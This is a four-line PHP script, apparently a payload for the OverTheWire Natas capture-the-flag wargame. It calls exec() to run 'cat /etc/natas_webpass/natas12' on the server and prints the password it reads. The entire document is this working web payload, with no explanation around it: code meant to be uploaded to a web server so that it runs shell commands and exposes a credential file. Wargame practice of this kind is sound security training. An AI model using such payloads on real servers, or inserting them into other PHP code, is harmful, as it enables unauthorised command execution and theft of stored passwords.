<?php

    exec("cat /etc/natas_webpass/natas12", $output);
    print_r($output[0]);

?>